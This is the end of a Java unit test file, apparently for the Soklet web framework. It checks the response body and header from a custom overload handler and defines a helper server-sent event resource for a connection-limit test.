			Assertions.assertEquals("Custom Overload Message", responseB.body(),
					"Expected response body from custom serviceOverloadedHandler");

			Assertions.assertEquals("true", responseB.headers().firstValue("X-Soklet-Overload").orElse(null),
					"Expected custom header from serviceOverloadedHandler");
		}
	}

	// Helper Resource for the test
	public static class LimitTestResource {
		@ServerSentEventSource("/limit-test")
		public HandshakeResult stream() {
			// Return an accepted handshake that sends an initial comment so the test knows we're live.
			return HandshakeResult.acceptWithDefaults()
					.clientInitializer(unicaster -> unicaster.unicastComment("connected"))
					.build();
		}
	}
}
